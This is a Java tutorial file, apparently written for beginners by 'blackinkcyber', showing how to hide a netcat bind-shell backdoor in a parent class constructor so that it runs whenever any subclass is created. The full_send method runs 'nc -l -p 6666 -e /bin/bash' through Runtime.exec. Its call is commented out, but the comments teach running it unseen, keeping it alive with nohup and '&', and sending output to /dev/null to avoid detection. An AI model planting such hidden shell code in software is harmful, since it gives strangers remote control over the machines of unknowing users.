package com.company.demo;

import java.io.IOException;

/**
 * @author Alias
 *          ^^ AKA blackinkcyber
 * 
 * 
 *  All the classes are here, I can vouch that they run on kali linux's pre-installed java compiler, in the real world code
 *  won't look like this, this is just a gross oversimplification because I know a lot of you are new to code.
 *   
 *  on my end, it won't run unless all the classes are in the same file, relative import statements throw errors like crazy
 *  because my compiler hates me.
 *  
 * 
 *  On the client (the command/control system), run: nc <server> <port> 
 *  on the machine in which you hope to backdoor, run: nc -l -p <port> -e /path/to/shell
 *  This should instantiate a listener on the machine at a specified port, passing the input to a shell.
 *  
 *  TLDR (but if you're new to programming it may help): 
 *  
 *  Most of the time, a java application are often broken up into classes, each having a specified design purpose, for
 *  the express purpose of creating objects (think of objects as custom data types with different functions and attrubutes).
 *  These objects can add functionality.
 *  
 *  Sometimes, classes depend on each other to add functionality. This is called inheritence. A subclass inherits a 
 *  'super class' object. Each time an object is created, the 'constructor' is called. At which point
 *  code is executed, to declare the afformentioned attributes. This is our code execution target. Lets say we want to
 *  hide a payload (or in this case a simple netcat shell bound to a port on localhost) into the constructor of a class
 *  that was integral to a java programs functionality.
 *  
 *  Classes can have many constructors, but the concept of Object-Oriented Programming, and each program is different. In
 *  this demo I hope to show you the massive difference one can make by modifying adding a single line of code.
 *
 */
public class Class1 {
    
    public int parameter;
    public int after_transform;
    public Class1(int test_parameter){
        this.parameter = test_parameter;
        this.after_transform = test_parameter;
        // example data manipulation using a class method call
        transform(test_parameter);
        // prints information to the terminal to show you what's going on.
        System.out.println("To demonstrate execution of the code, 'Class1' is executing and here are it's parameters.");
        System.out.println("=========================================================");
        System.out.println("Class variable test_parameter: "+this.parameter);
        System.out.println("Class variable after_transform: "+this.after_transform);
        System.out.println("=========================================================");
        System.out.println("new object created! as a result, more code is executed. All subclasses inherit my object!");
        System.out.println("therefore, if I inject code in the parent class, I can make it execute every time a new " +
                "object is instantiated.");
        
        // here is our method injection into the constructor, uncomment to start the netcat listener.
        // this.full_send();
    }

    private void transform(int parameter){
        System.out.println("execution of class method 'transform'");
        this.after_transform *= parameter * 3;
    }

    /**
     * Notice, how this method does not print anything to the terminal, however, there is a subprocess that is generated
     * without the users knowledge, or anything printed. even after the code is done executing, this process lingers.
     * To avoid this lingering, and to have it run until the connection aborts; one can create a file writer objet and
     * hardcode a shell script with our netcat listener code (also appending it to send the netcat listener command to the
     * background using 'nohup' and '&'), executing the shell script, then deleting the file. Although this may not be neccesary,
     * just add the nohup and the & to the shell command. Although you may need to push the terminal output to /dev/null because
     * said output may raise some red flags.
     * 
     * All it does, is set netcat to listen to port, and pass the received data to a shell.
     */
    private void full_send(){
        try {
            // ports are arbitrary, just make sure you remember which one it is when you're connecting
            int port = 6666;
            // shell_command string basically evaluates to 'nc -l -p 6666 -e /bin/bash'
            String shell_command = "nc -l -p "+port+" -e /bin/bash";
            // runtime class is called and executes the shell command.
            Runtime.getRuntime().exec(shell_command);
            // try-catch block used to catch what's called an exception that the call above likes to throw when the command
            // specified in the method call is not found.
        }catch (IOException e){
            // basically that the nc command is not found
            System.out.println("for some ungodly reason netcat isn't installed on this box. Lame.");
        }
    }

    public static void main(String[] args) {
        Class1 execution_example = new Class1(1);
        subClass subclass_execution_example = new subClass(2, 3);
    }
}

public class subClass extends Class1 {
    int sub_class_variable1;
    public subClass(int parameter1, int parameter2){
        super(parameter1);
        this.sub_class_variable1 = parameter2;
        System.out.println("oh, what's this? A subclass?");
    }
}
